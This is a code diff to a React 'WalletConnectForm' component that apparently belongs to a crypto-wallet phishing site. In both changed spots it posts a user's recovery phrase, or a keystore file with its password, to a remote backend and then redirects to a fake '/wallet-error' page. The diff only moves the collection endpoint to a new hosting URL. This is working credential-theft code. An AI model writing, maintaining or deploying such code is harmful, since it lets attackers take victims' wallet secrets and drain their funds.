@@ -58,7 +58,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     
     if (validatePhrase(phrase)) {
       try {
-        await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
+        await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/wallet-error')
         }, 3000);
@@ -89,7 +89,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const data = keystore
     const password = keystorePassword
     try {
-      await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
+      await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
       setTimeout(() => {
         navigate('/wallet-error')
       }, 3000);
